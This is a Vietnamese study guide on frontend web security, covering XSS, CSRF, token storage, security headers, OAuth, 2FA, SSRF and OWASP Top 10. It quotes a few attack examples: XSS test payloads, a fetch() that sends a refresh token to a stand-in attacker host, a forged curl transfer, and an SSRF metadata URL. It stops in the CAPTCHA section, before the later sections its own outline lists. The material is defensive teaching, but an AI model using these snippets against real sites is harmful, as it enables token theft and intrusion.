# 🔒 Topic 28: Web Security cho Frontend - Defense in Depth, Auth, Headers, OWASP & Production Practices

## 1. ⭐ Senior/Staff Summary

Security frontend không chỉ là “chặn XSS” hay “lưu token ở đâu”. Ở mức senior/staff, cần nghĩ theo **defense in depth**: mỗi layer giảm rủi ro cho layer khác, vì không có biện pháp nào đủ mạnh một mình.

Các key của file gốc được gom lại theo 10 nhóm:

- 🧱 **Defense in Depth:** HTTPS/TLS, XSS, CSRF, AuthN/AuthZ, secure storage, API security, security headers.
- 🔐 **Auth flow an toàn:** access token, refresh token, `HttpOnly` cookie, rotation, logout, multi-device, banking/trading use case.
- 🧨 **Pitfalls:** lưu token trong `localStorage`, chỉ validate client-side, thiếu CSP, hardcode secrets, thiếu rate limit, dùng `eval`/`dangerouslySetInnerHTML`.
- ⚖️ **Comparisons:** auth methods, XSS defenses, storage choices.
- 🏦 **Scenario dự án lớn:** e-banking rollout theo phase: critical fixes, enhanced security, monitoring/compliance.
- ⚡ **Security optimization:** token refresh strategy, CSP nonce, sliding-window rate limit, lazy-load DOMPurify, parallel security checks.
- 🧭 **OWASP Top 10:** Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Misconfiguration, Vulnerable Components, Auth Failures, Integrity Failures, Logging/Monitoring, SSRF.
- 🧩 **Additional topics:** file upload, OAuth 2.0/OIDC, 2FA, SSRF, SRI, CAPTCHA, WAF, security testing tools.
- ✅ **Production checklist:** auth, XSS, CSRF, HTTPS, API, headers, dependencies, sensitive data, monitoring, testing.
- 📚 **Glossary:** các thuật ngữ và viết tắt security thường gặp.

> 🔥 Senior point: Frontend **không phải security boundary cuối cùng**. Client có thể bị sửa, request có thể bị giả lập, storage có thể bị đọc nếu XSS. Server/API phải enforce authorization, validation, rate limit và audit logging.

### ✅ Coverage map từ file gốc

| Nhóm key trong file gốc | Trong bản mới nằm ở đâu | Ghi chú |
|---|---|---|
| 7 tầng bảo mật | `3.1` -> `3.8` | Giữ đủ HTTPS/TLS, XSS, CSRF, Auth/AuthZ, Storage, API, Headers |
| Pitfalls | `3.9`, `6` | Giữ đủ 6 lỗi lớn và thêm lỗi production hay gặp |
| So sánh kỹ thuật | `3.10`, `7` | Auth methods, XSS defenses, storage security |
| E-banking scenario | `3.11`, `3.22` | Giữ phase rollout và auth flow ngân hàng/chứng khoán |
| Security optimization | `3.12`, `3.23` | Token refresh, CSP nonce, rate limit, DOMPurify, performance/security tradeoff |
| OWASP Top 10 | `3.13` | Có quick reference và phân tích từng risk dưới góc frontend |
| Additional topics | `3.14` -> `3.21` | File upload, OAuth/OIDC, 2FA, SSRF, SRI, CAPTCHA, WAF, testing tools |
| Config mẫu | `3.24` | Nginx/security headers, GitHub Actions scanning |
| Checklist production | `7` | Dạng hỏi-đáp ngắn để ôn phỏng vấn |
| Glossary | `9` | Giữ thuật ngữ chính, tránh quá dài nhưng đủ ý |

## 2. 🧠 Key Mental Model

- **Never trust client-side:** UI validation chỉ giúp UX; backend vẫn phải validate và authorize.
- **Assume XSS can happen:** giảm blast radius bằng CSP, output encoding, sanitization, `HttpOnly` cookie, dependency hygiene.
- **AuthN khác AuthZ:** đăng nhập thành công không đồng nghĩa có quyền truy cập resource.
- **Token storage là tradeoff:** `HttpOnly` cookie giảm token theft qua JS nhưng cần CSRF mitigation; `localStorage` dễ dùng nhưng XSS đọc được.
- **Security headers là guardrails:** CSP, HSTS, frame protection, MIME sniffing, referrer policy, permissions policy.
- **Supply chain là frontend risk thật:** npm dependency, CDN script, build pipeline, SRI, lockfile, audit.
- **Security phải observable:** log, alert, anomaly detection, failed login, token refresh abuse, rate-limit hit.
- **Performance vs security cần cân bằng:** bảo mật không nên làm UX tệ, nhưng không được tối ưu bằng cách bỏ lớp phòng thủ quan trọng.

## 3. 📚 Main Concepts

### 3.1. 🧱 Defense in Depth - 7 tầng bảo mật chính

| Tầng | Mục tiêu | Frontend cần làm | Backend/Infra cần làm |
|---|---|---|---|
| 1. HTTPS/TLS | Bảo vệ dữ liệu khi truyền | Không gọi mixed content, dùng HTTPS URL | TLS đúng, HSTS, redirect HTTP→HTTPS |
| 2. XSS Prevention | Chặn script độc hại chạy trong page | Escape output, tránh unsafe HTML, sanitize rich text, CSP | Validate/encode data, CSP nonce/hash |
| 3. CSRF Protection | Chặn request giả mạo dùng cookie | Gửi CSRF token/header khi cần | `SameSite`, CSRF token, Fetch Metadata |
| 4. AuthN/AuthZ | Xác thực và phân quyền | Không tin role ở client, guard UI chỉ để UX | Enforce permission trên API/resource |
| 5. Secure Storage | Giảm rủi ro lộ sensitive data | Không lưu secret/token nhạy cảm trong JS-readable storage | Set secure cookie, session rotation |
| 6. API Security | Bảo vệ endpoint | Handle 401/403, không leak error nhạy cảm | Rate limit, validation, CORS, audit log |
| 7. Security Headers | Browser-level protection | Hiểu impact với asset/script | CSP, HSTS, X-Frame-Options/CSP frame-ancestors, nosniff |

Phân tích dễ hiểu:

- **Tầng network** như HTTPS/TLS bảo vệ đường truyền. Nếu thiếu tầng này, attacker ở Wi-Fi/proxy có thể đọc hoặc sửa request.
- **Tầng browser** như CSP/security headers giảm khả năng browser thực thi hành vi nguy hiểm.
- **Tầng app frontend** giảm lỗi do render unsafe HTML, lưu token sai, route guard sai.
- **Tầng API/backend** mới là nơi quyết định cuối: validate input, authorize resource, rate limit, audit log.
- **Tầng monitoring** giúp phát hiện khi defense bị bypass: login fail bất thường, token reuse, transfer lạ.

Ví dụ threat model ngắn:

```txt
Attacker có XSS
  -> đọc localStorage/sessionStorage/non-HttpOnly cookie
  -> gọi API bằng session hiện tại
  -> nếu API thiếu AuthZ, đọc/sửa dữ liệu user khác
  -> nếu thiếu audit log, incident khó điều tra
```

Defense tương ứng:

```txt
Sanitize + CSP
HttpOnly cookie / không lưu token nhạy cảm trong localStorage
Server-side authorization per resource
Rate limit + audit log + anomaly alert
```

### 3.2. 🔐 HTTPS + TLS

HTTPS bảo vệ confidentiality và integrity khi dữ liệu đi qua network. Nhưng HTTPS không tự giải quyết XSS, CSRF, broken access control hay token misuse.

Production baseline:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Checklist:

- ✅ Redirect HTTP sang HTTPS.
- ✅ Không load `http://` script/image/API trong HTTPS page.
- ✅ Dùng HSTS sau khi chắc chắn domain/subdomain hỗ trợ HTTPS.
- ✅ Cookie auth phải có `Secure`.

Các lỗi production hay gặp:

- Mixed content: page HTTPS nhưng load script/image/API qua HTTP.
- Cookie thiếu `Secure`, bị gửi qua HTTP trong môi trường cấu hình sai.
- HSTS bật quá sớm với `includeSubDomains` khi subdomain chưa hỗ trợ HTTPS.
- CDN/proxy terminate TLS nhưng app backend vẫn build absolute URL `http://`.

Debug nhanh:

```bash
curl -I https://example.com
```

Kiểm tra:

- Có redirect HTTP -> HTTPS không.
- Có `Strict-Transport-Security` không.
- Cookie có `Secure`, `HttpOnly`, `SameSite` không.
- Không có asset `http://` trong HTML.

### 3.3. 🧨 XSS Prevention

XSS xảy ra khi untrusted data được đưa vào HTML/JS/CSS/URL context mà không encode/sanitize đúng.

Các dạng thường gặp:

- **Stored XSS:** payload lưu trong DB rồi render cho nhiều user.
- **Reflected XSS:** payload từ URL/request được reflect vào response.
- **DOM XSS:** client JS đọc input như `location.hash` rồi ghi vào DOM không an toàn.

❌ Sai:

```tsx
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

✅ Tốt hơn khi cần render rich text:

```tsx
async function SafeComment({ html }: { html: string }) {
  const { default: DOMPurify } = await import("dompurify");
  const clean = DOMPurify.sanitize(html);

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Key defenses:

- Encode theo context: HTML, attribute, URL, JS string, CSS.
- Tránh `eval`, `new Function`, inline event handlers.
- Dùng sanitizer cho rich text.
- CSP để giảm impact nếu injection lọt qua.
- Không đưa untrusted data vào `script`, `style`, `srcdoc`, URL nguy hiểm.

> ⚠️ React auto-escapes text interpolation, nhưng không bảo vệ nếu dùng `dangerouslySetInnerHTML`, third-party DOM manipulation, unsafe URL, hoặc tự build HTML string.

Các context cần encode khác nhau:

| Context | Ví dụ nguy hiểm | Cách xử lý |
|---|---|---|
| HTML text | `<div>${userInput}</div>` | HTML escape |
| HTML attribute | `<img alt="${userInput}">` | Attribute escape, validate value |
| URL | `<a href="${userInput}">` | Allowlist scheme `https:`, reject `javascript:` |
| JavaScript string | `<script>var x="${userInput}"</script>` | Tránh inline script; nếu bắt buộc, JS string escape |
| CSS | `style="background:url(...)"` | Tránh untrusted CSS; allowlist |

React-specific notes:

- `{value}` trong JSX text thường được escape.
- `href={userUrl}` vẫn cần validate URL scheme.
- `style={{ backgroundImage: ... }}` không tự biến untrusted CSS thành an toàn.
- Rich text từ CMS/user phải sanitize ở boundary và có test case XSS.

Test payload cơ bản khi review:

```txt
<img src=x onerror=alert(1)>
javascript:alert(1)
"><svg/onload=alert(1)>
```

Không dùng payload này để “chứng minh app an toàn”; nó chỉ bắt lỗi đơn giản. App production cần sanitizer đúng, CSP và security testing.

### 3.4. 🛡️ CSRF Protection

CSRF lợi dụng browser tự gửi cookie trong request cross-site. Nếu app dùng cookie-based auth, cần CSRF mitigation.

Defense phổ biến:

- `SameSite=Lax` hoặc `Strict` cho session cookie.
- CSRF token trong form/header.
- Double-submit cookie pattern nếu phù hợp.
- Validate `Origin`/`Referer` cho state-changing requests.
- Fetch Metadata headers như `Sec-Fetch-Site` để reject cross-site request rủi ro.

Ví dụ request có CSRF token:

```ts
async function transferMoney(payload: TransferPayload, csrfToken: string) {
  const response = await fetch("/api/transfers", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken,
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) throw new Error("Transfer failed");
}
```

> 🔥 XSS có thể đánh bại nhiều CSRF defenses vì attacker chạy JS trong same origin. Vì vậy phải xử lý XSS trước.

Khi nào CSRF đáng lo?

- App dùng cookie/session tự gửi theo request.
- Endpoint thay đổi trạng thái: transfer, checkout, update email, change password, delete account.
- Request có thể bị trigger bằng form/image/script từ site khác.

Khi nào CSRF ít liên quan hơn?

- API chỉ dùng `Authorization: Bearer ...` header mà attacker site khác không đọc được token.
- Nhưng nếu token nằm trong JS-readable storage và app bị XSS, vấn đề chuyển thành XSS/token theft.

Pattern thực tế:

```txt
Cookie session + SameSite=Lax
+ CSRF token cho POST/PUT/PATCH/DELETE
+ Origin/Referer validation
+ Fetch Metadata reject cross-site risky requests
```

Với OAuth/social login, `state` cũng là một dạng CSRF protection cho login flow. Thiếu `state` có thể dẫn tới login CSRF/session confusion.

### 3.5. 👤 Authentication vs Authorization

**Authentication** trả lời: user là ai?

**Authorization** trả lời: user được làm gì với resource nào?

Pitfall thường gặp:

```ts
// ❌ Sai: chỉ ẩn nút ở frontend, API vẫn cho gọi
if (user.role === "admin") {
  showDeleteButton();
}
```

Đúng hơn:

- Frontend guard UI để UX tốt.
- Backend kiểm tra permission cho từng request.
- Resource-level authorization: user A không được đọc `/users/B/statement`.
- Không tin claim/role được client tự gửi.

Ví dụ broken access control:

```txt
User A đăng nhập -> gọi GET /api/accounts/A
Attacker đổi URL thành GET /api/accounts/B
Nếu API chỉ check "đã login" mà không check owner -> lộ dữ liệu User B
```

Frontend có thể:

- Không render link/nút không có quyền.
- Refresh permission khi role thay đổi.
- Handle `403` rõ ràng.

Nhưng frontend không thể:

- Ngăn attacker gọi API bằng curl/Postman.
- Che giấu endpoint thật nếu API không authorize.
- Dùng obfuscation để thay thế permission check.

### 3.6. 🍪 Secure Storage: Cookie vs localStorage vs memory

| Storage | Ưu điểm | Rủi ro | Khi dùng |
|---|---|---|---|
| `HttpOnly` cookie | JS không đọc được, tốt cho session | Cần CSRF protection, cookie config phức tạp | Session/refresh token production |
| `localStorage` | Dễ dùng, persistent | XSS đọc được, khó revoke tức thì | Non-sensitive preferences |
| `sessionStorage` | Tab-scoped | XSS đọc được, mất khi đóng tab | Draft tạm, non-sensitive |
| Memory | XSS khó lấy hơn storage persistent nhưng vẫn có thể gọi API | Mất khi reload, cần refresh flow | Access token ngắn hạn trong SPA |

Recommended auth baseline:

```http
Set-Cookie: __Host-session=opaque_session_id; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

> ✅ Với hệ thống nhạy cảm như banking/trading: ưu tiên opaque session/refresh token trong `HttpOnly Secure SameSite` cookie, access token ngắn hạn, rotation, device/session management và server-side revocation.

Phân tích tradeoff:

**`localStorage`**

- Dễ implement trong SPA.
- Tồn tại sau reload/tab close.
- Nhưng XSS đọc được ngay.
- Token bị lấy có thể dùng từ máy attacker cho đến khi hết hạn/revoke.

**`HttpOnly` cookie**

- JavaScript không đọc được nên XSS khó đánh cắp token trực tiếp.
- Browser tự gửi cookie nên cần CSRF protection.
- Server dễ revoke session nếu dùng opaque session id.

**Memory access token**

- Giảm persistent token theft.
- Reload mất token, cần refresh/session flow.
- XSS vẫn có thể gọi API trong phiên hiện tại, nên vẫn cần CSP/sanitize/AuthZ.

Senior recommendation:

```txt
Low-risk preference -> localStorage
Sensitive auth -> HttpOnly Secure SameSite cookie
Short-lived access token -> memory/server session
PII/payment/account data -> không persist ở client nếu không cần
```

### 3.7. 🔌 API Security

Frontend cần handle security response đúng, nhưng API mới là nơi enforce chính.

Frontend responsibilities:

- Gửi `credentials`/headers đúng policy.
- Handle `401` bằng refresh/login flow.
- Handle `403` bằng thông báo không có quyền, không retry vô hạn.
- Không log token/PII vào console/monitoring.
- Không expose internal error message nhạy cảm.

Backend/API responsibilities:

- Validate input bằng schema.
- Rate limit theo IP/user/device/session.
- Enforce authorization trên resource.
- CORS allowlist đúng.
- Audit log state-changing actions.
- Idempotency key cho payment/order/transfer.

CORS note:

```txt
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Không dùng:

```txt
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Lý do: credentials với wildcard origin là cấu hình sai và browser cũng không cho phép theo cách an toàn. Với API nội bộ, dùng allowlist origin rõ ràng và kiểm soát preflight.

Error handling:

- `401 Unauthorized`: chưa đăng nhập/session hết hạn.
- `403 Forbidden`: đã đăng nhập nhưng không có quyền.
- `429 Too Many Requests`: bị rate limit.
- `400/422`: input invalid, không leak stack trace.
- `500`: lỗi server, không hiển thị chi tiết nội bộ.

### 3.8. 🧾 Security Headers

Baseline headers:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

Notes:

- `X-Frame-Options` vẫn hữu ích nhưng CSP `frame-ancestors` linh hoạt hơn.
- CSP nên bắt đầu bằng `Content-Security-Policy-Report-Only` để đo impact trước.
- CSP nonce phải random per response, không hardcode.
- `unsafe-inline` nên tránh; nếu cần tạm thời, có plan remove.

Header nào bảo vệ gì?

| Header | Bảo vệ chính | Lưu ý |
|---|---|---|
| `Content-Security-Policy` | Giảm XSS/data injection impact | Cần rollout cẩn thận vì dễ làm hỏng app |
| `Strict-Transport-Security` | Ép HTTPS | Chỉ bật preload khi chắc chắn |
| `X-Content-Type-Options: nosniff` | Chống MIME sniffing | Baseline gần như nên bật |
| `frame-ancestors` | Chống clickjacking | Nằm trong CSP |
| `Referrer-Policy` | Giảm leak URL/referrer | `strict-origin-when-cross-origin` là baseline tốt |
| `Permissions-Policy` | Tắt browser capabilities không dùng | Camera/mic/geolocation/payment |

CSP rollout an toàn:

```txt
1. Chạy Report-Only
2. Thu thập violation reports
3. Fix inline script/style, CDN allowlist
4. Chuyển sang enforce
5. Theo dõi error/violation sau deploy
```

### 3.9. 🚫 Common Pitfalls từ file gốc

| Pitfall | Vì sao nguy hiểm | Fix ngắn |
|---|---|---|
| Lưu sensitive data trong `localStorage` | XSS đọc được | Dùng `HttpOnly` cookie/session, giảm token lifetime |
| Client-side validation only | Attacker gọi API trực tiếp | Backend validation bắt buộc |
| Không set CSP | XSS impact lớn hơn | CSP nonce/hash + report-only rollout |
| Hardcode secrets trong frontend | Bundle public, ai cũng đọc được | Secrets chỉ ở server/build infra |
| Không rate limit | Brute force, spam, scraping | Rate limit theo user/IP/device/action |
| Dùng `eval`/unsafe HTML | Code injection | Loại bỏ eval, sanitize rich text |

Phân tích từng lỗi:

**1. Lưu sensitive data trong `localStorage`**

Ví dụ xấu:

```ts
localStorage.setItem("accessToken", token);
localStorage.setItem("refreshToken", refreshToken);
```

Nếu có XSS, attacker chỉ cần:

```ts
fetch("https://evil.example/steal", {
  method: "POST",
  body: localStorage.getItem("refreshToken"),
});
```

Fix không chỉ là “đổi chỗ lưu token”. Cần:

- Giảm XSS bằng sanitize/CSP.
- Dùng `HttpOnly` cookie hoặc BFF/server session.
- Token ngắn hạn + rotation + revoke.
- Monitoring refresh token reuse.

**2. Client-side validation only**

Frontend validation giúp UX, không giúp security. Attacker có thể gọi API trực tiếp:

```bash
curl -X POST https://api.example.com/transfers \
  -d '{"amount":1000000000,"toAccount":"attacker"}'
```

Backend phải validate amount, account owner, limit, risk score, 2FA state và idempotency.

**3. Không set CSP**

Không có CSP nghĩa là một bug injection nhỏ có thể thành full script execution. CSP không thay thế việc fix XSS, nhưng giảm khả năng load script lạ, inline script hoặc exfiltrate data.

**4. Hardcode secrets**

Mọi biến trong frontend bundle đều public:

```ts
const STRIPE_SECRET_KEY = "sk_live_...";
```

Nếu secret lộ:

- Rotate ngay.
- Audit usage.
- Di chuyển logic sang server.
- Thêm secret scanning vào CI.

**5. Không rate limit**

Rate limit không chỉ cho login. Cần cho:

- OTP resend/verify.
- Password reset.
- Search expensive.
- File upload.
- Payment/transfer attempt.
- Refresh token endpoint.

**6. `eval` / unsafe HTML**

`eval`, `new Function`, string-based script execution làm CSP yếu đi và mở cửa code injection. Với HTML dynamic, dùng template/component framework hoặc sanitizer có allowlist rõ ràng.

### 3.10. ⚖️ So sánh kỹ thuật quan trọng

**Authentication methods**

| Method | Ưu điểm | Nhược điểm | Phù hợp |
|---|---|---|---|
| Cookie session | Server control tốt, revoke dễ | Cần CSRF mitigation | Web app truyền thống, banking |
| JWT in memory | Giảm persistent theft | Mất khi reload, cần refresh | SPA có refresh flow tốt |
| JWT in localStorage | Dễ implement | XSS đọc token | Tránh cho app nhạy cảm |
| OAuth/OIDC | Delegated login chuẩn | Flow phức tạp | Social login, enterprise SSO |

**XSS defenses**

| Defense | Vai trò | Không thay thế |
|---|---|---|
| Output encoding | Chặn injection theo context | Sanitization rich text |
| Sanitizer | Làm sạch HTML user-generated | CSP |
| CSP | Giảm impact injection | Fix XSS gốc |
| HttpOnly cookie | Giảm token theft qua JS | XSS prevention |

**Storage security**

| Dữ liệu | Nên lưu ở đâu |
|---|---|
| Theme/language | `localStorage` |
| CSRF token readable by JS | Cookie non-HttpOnly hoặc response bootstrap tùy pattern |
| Session/refresh token | `HttpOnly Secure SameSite` cookie |
| Access token ngắn hạn | Memory hoặc server-side session |
| PII nhạy cảm | Tránh lưu client nếu không cần |

### 3.11. 🏦 Case Study: E-Banking Security Rollout

**Phase 1: Critical fixes**

- Chuyển token khỏi `localStorage` sang `HttpOnly Secure SameSite` cookie.
- Bật HTTPS/HSTS.
- Thêm CSRF protection cho state-changing actions.
- Loại bỏ `dangerouslySetInnerHTML` không sanitize.
- Backend enforce authorization theo account/resource.

Mục tiêu Phase 1 là giảm rủi ro nghiêm trọng nhất trước:

```txt
Token theft -> giảm bằng HttpOnly cookie
CSRF transfer -> thêm CSRF token/SameSite
XSS rich text -> sanitize/remove unsafe render
Broken access control -> API check account ownership
No TLS/HSTS -> enforce HTTPS
```

Definition of done:

- Login/logout/refresh flow chạy ổn trên iOS/Android/Desktop.
- Transfer endpoint reject request thiếu CSRF token.
- Account API test case user A không đọc được user B.
- Security headers có test tự động.
- Không còn token nhạy cảm trong `localStorage`.

**Phase 2: Enhanced security**

- CSP `Report-Only` rồi enforce.
- Token rotation và session revocation.
- Rate limiting cho login, OTP, transfer.
- Device/session management.
- Dependency scanning trong CI.
- SRI cho CDN asset nếu phải dùng CDN.

Mục tiêu Phase 2 là giảm bypass và tăng kiểm soát:

- CSP từ `Report-Only` sang enforce theo từng route/domain.
- Rate limit theo risk: login khác transfer, OTP khác search.
- Session management: user xem và revoke device.
- Step-up auth cho transfer lớn hoặc thay đổi thông tin nhạy cảm.
- Dependency bot tạo PR update định kỳ.

**Phase 3: Monitoring & compliance**

- Audit log transfer/login/security setting changes.
- Alert bất thường: login fail nhiều, impossible travel, refresh token reuse.
- Security dashboard.
- Pen test, SAST/DAST, dependency audit.
- Incident response playbook.

Security event nên log:

- Login success/fail.
- Password/2FA/security setting changes.
- Token refresh fail/reuse.
- Transfer/order/withdrawal.
- Permission denied cho resource nhạy cảm.
- Rate-limit hit.

Không log:

- Raw token.
- Password/OTP.
- Full card/bank/account sensitive fields nếu không cần.
- PII vượt quá mục tiêu audit.

### 3.12. ⚡ Security Optimization

**Token refresh strategy**

- Access token ngắn hạn.
- Refresh token/session cookie rotate.
- Single-flight refresh để tránh nhiều request refresh cùng lúc.
- Detect reuse để revoke session.

Vấn đề thực tế:

```txt
10 API calls cùng nhận 401
-> cả 10 cùng gọi /refresh
-> race condition, refresh token rotate nhiều lần
-> một số request fail, user bị logout sai
```

Fix:

- Single-flight refresh ở client.
- Server refresh token rotation idempotent theo window ngắn hoặc detect reuse rõ.
- Queue/retry request sau refresh.
- Nếu refresh fail, clear client state và redirect login.

**CSP với nonce**

```html
<script nonce="random-per-request">
  window.__BOOTSTRAP__ = {};
</script>
```

```http
Content-Security-Policy: script-src 'self' 'nonce-random-per-request'
```

**Rate limiting với sliding window**

- Login: theo IP + username + device fingerprint thận trọng.
- OTP: cooldown và max attempt.
- API sensitive: theo user/session/action.

Tradeoff:

- Rate limit quá lỏng -> brute force/spam.
- Rate limit quá chặt -> user thật bị block.
- Với banking/trading, nên kết hợp risk scoring: device mới, IP lạ, hành vi bất thường, transfer amount.

**Lazy-load DOMPurify**

- Chỉ load sanitizer ở nơi render rich text.
- Không trì hoãn sanitize để đổi lấy performance nếu content untrusted đã render.

Pattern an toàn:

```txt
Nếu content untrusted cần render ngay -> sanitizer phải sẵn trước render
Nếu content nằm dưới fold/modal -> có thể lazy-load sanitizer trước khi mở modal
Nếu content có thể sanitize server-side -> vẫn cân nhắc sanitize/encode client theo context
```

**Parallel security checks**

- Có thể chạy permission preload, feature policy, risk score song song.
- Nhưng authorization cuối vẫn ở server endpoint.

### 3.13. 🚨 OWASP Top 10 Quick Reference

| OWASP 2021 | Frontend cần hiểu |
|---|---|
| A01 Broken Access Control | UI guard không đủ; API phải enforce authorization |
| A02 Cryptographic Failures | Không tự chế crypto; dùng HTTPS, secure cookie, secret server-side |
| A03 Injection | XSS/HTML injection/command injection qua unsafe input |
| A04 Insecure Design | Thiếu threat model, thiếu abuse case |
| A05 Security Misconfiguration | Headers/CORS/cookie/env sai |
| A06 Vulnerable and Outdated Components | npm package/CDN dependency có CVE |
| A07 Identification and Authentication Failures | Login/session/refresh/2FA yếu |
| A08 Software and Data Integrity Failures | Supply chain, SRI, CI/CD integrity |
| A09 Logging and Monitoring Failures | Không phát hiện attack hoặc incident |
| A10 SSRF | Frontend trigger URL fetch, backend fetch nội bộ sai policy |

Phân tích sâu theo góc frontend:

**A01 Broken Access Control**

- Dấu hiệu: đổi `userId`/`accountId` trong URL vẫn đọc được dữ liệu.
- Frontend guard không đủ; API phải check ownership/role/scope.
- Test nên có case user thường gọi admin endpoint và user A gọi resource user B.

**A02 Cryptographic Failures**

- Dấu hiệu: tự mã hóa token ở client, lưu key cạnh ciphertext, dùng HTTP.
- Không tự chế crypto. Secret/key không được nằm trong frontend.
- Dữ liệu nhạy cảm nên giảm lưu client, dùng TLS và server-side controls.

**A03 Injection**

- Frontend gặp nhiều nhất là XSS, HTML injection, unsafe URL.
- Backend còn có SQL/NoSQL/command injection.
- Defense: parameterized queries server-side, output encoding, sanitizer, CSP.

**A04 Insecure Design**

- Dấu hiệu: flow reset password không threat model, transfer không step-up auth, thiếu abuse case.
- Fix bằng design review: attacker goal, assets, trust boundaries, misuse cases.

**A05 Security Misconfiguration**

- Headers thiếu, CORS quá rộng, cookie flag sai, debug mode bật, source maps public.
- Fix bằng baseline config và automated checks.

**A06 Vulnerable and Outdated Components**

- Frontend npm dependency có CVE hoặc package bị takeover.
- Fix bằng lockfile, Dependabot/Renovate, SCA scan, review package risk.

**A07 Identification and Authentication Failures**

- Login không rate limit, session không rotate, password reset yếu, 2FA recovery yếu.
- Fix bằng rate limit, secure session, MFA/passkey, device/session management.

**A08 Software and Data Integrity Failures**

- CDN script bị sửa, CI/CD bị compromise, dependency install không pin.
- Fix bằng SRI, lockfile, protected branches, signed artifacts nếu cần.

**A09 Logging and Monitoring Failures**

- Không biết ai đổi email, ai fail OTP 20 lần, ai reuse refresh token.
- Fix bằng structured audit logs và alert threshold.

**A10 SSRF**

- Frontend thường là nơi nhập URL; server mới fetch URL.
- Fix server-side allowlist, private IP block, DNS rebinding protection, timeout/size limits.

### 3.14. 📁 File Upload Security

Risks:

- Malware upload.
- SVG XSS.
- MIME spoofing.
- Oversized files.
- Path traversal.
- Public bucket exposure.

Checklist:

- Validate extension + MIME + magic bytes server-side.
- Size limit.
- Store outside web root hoặc object storage private.
- Virus scan nếu domain cần.
- Rename file server-side.
- Serve uploaded files với safe headers.
- Không trust client-side file validation.

Ví dụ rủi ro SVG:

```txt
User upload avatar.svg chứa <script>
App serve lại SVG cùng origin
Browser execute script trong origin của app
-> XSS
```

Mitigation:

- Convert image sang format an toàn server-side nếu có thể.
- Serve upload từ domain riêng không có cookie auth.
- Set `Content-Disposition: attachment` nếu không cần render inline.
- Với PDF/Office, cân nhắc virus scan và sandbox preview.

### 3.15. 👤 OAuth 2.0 & OpenID Connect

Key points:

- OAuth 2.0 là authorization framework; OIDC thêm identity layer.
- SPA nên dùng Authorization Code Flow with PKCE.
- Không dùng Implicit Flow cho app mới nếu có thể tránh.
- Validate `state` để chống CSRF/login injection.
- Validate `nonce` với ID token.
- Token exchange nên qua backend/BFF khi app nhạy cảm.

Flow đúng cho SPA hiện đại:

```txt
1. App tạo code_verifier + code_challenge
2. Redirect user tới Authorization Server với state + nonce + code_challenge
3. User login/consent
4. Authorization Server redirect về app với code
5. App/backend đổi code lấy token bằng code_verifier
6. Validate state/nonce/token claims
```

Các lỗi hay gặp:

- Thiếu `state`, dễ login CSRF.
- Dùng implicit flow cũ.
- Lưu token OAuth dài hạn trong `localStorage`.
- Không validate issuer/audience/expiry.
- Redirect URI allowlist quá rộng.

### 3.16. 🔒 Two-Factor Authentication (2FA)

Các loại:

- TOTP authenticator app.
- WebAuthn/passkeys.
- SMS OTP, tiện nhưng yếu hơn.
- Backup codes.

Production notes:

- Rate limit OTP verify/resend.
- Recovery flow phải an toàn.
- Log thay đổi 2FA.
- Step-up auth cho hành động nhạy cảm như transfer/rút tiền/đổi thông tin.

So sánh nhanh:

| Method | Mạnh/yếu | Note |
|---|---|---|
| SMS OTP | Dễ dùng nhưng yếu hơn | SIM swap, interception, phishing |
| TOTP app | Tốt hơn SMS | Vẫn có thể bị phishing |
| WebAuthn/passkey | Mạnh nhất trong nhóm phổ biến | Phishing-resistant hơn |
| Backup codes | Cần cho recovery | Phải hiển thị/lưu an toàn |

2FA UX cần:

- Recovery flow rõ.
- Không khóa user vĩnh viễn vì mất device.
- Notify khi bật/tắt 2FA.
- Require re-auth trước khi tắt 2FA.

### 3.17. 🚫 SSRF

SSRF xảy ra khi attacker ép server gọi URL ngoài ý muốn, ví dụ internal metadata service.

Frontend liên quan khi:

- Cho user nhập URL để preview/fetch/import.
- Image proxy.
- Webhook tester.
- PDF/screenshot generator.

Mitigation ở server:

- Allowlist domain/scheme.
- Block private IP ranges.
- Resolve DNS cẩn thận, chống DNS rebinding.
- Timeout/size limit.
- Không forward sensitive headers.

Ví dụ:

```txt
User nhập URL: http://169.254.169.254/latest/meta-data/
Backend image proxy fetch URL này
-> attacker đọc cloud metadata nếu server không chặn private IP
```

Frontend nên:

- Không gọi URL user nhập trực tiếp từ privileged backend nếu không có policy.
- Hiển thị rõ domain sẽ fetch.
- Không gửi cookie/internal headers tới URL ngoài.

Backend vẫn là nơi enforce chính.

### 3.18. 🔐 Subresource Integrity (SRI)

SRI giúp browser kiểm tra tài nguyên từ CDN có bị thay đổi không.

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-BASE64_HASH"
  crossorigin="anonymous"
></script>
```

Dùng khi phải load script/style từ CDN. Nếu tự host và build pipeline kiểm soát tốt, SRI không phải lúc nào cũng cần.

Khi nên dùng SRI:

- Third-party CDN script/style.
- Static asset version cố định.
- Script ảnh hưởng security như payment widget analytics critical.

Khi SRI gây khó:

- Asset URL trỏ tới `latest`.
- CDN tự thay đổi content ở cùng URL.
- Build pipeline inject dynamic content.

Nếu SRI hash mismatch, browser sẽ chặn resource. Đây là hành vi đúng nhưng cần monitoring để phát hiện nhanh.

### 3.19. 🤖 CAPTCHA

CAPTCHA giảm bot abuse nhưng ảnh hưởng UX/accessibility.

Dùng cho:

- Signup/login brute force.
- Password reset abuse.
- High-risk form submission.
- Scraping/spam endpoint.

Không nên dùng CAPTCHA như lớp bảo mật duy nhất. Kết hợp rate limiting, risk scoring, email/phone verification, WAF, monitoring.

CAPTCHA nên dùng theo risk:

- Không hiện cho mọi user nếu có thể tránh.
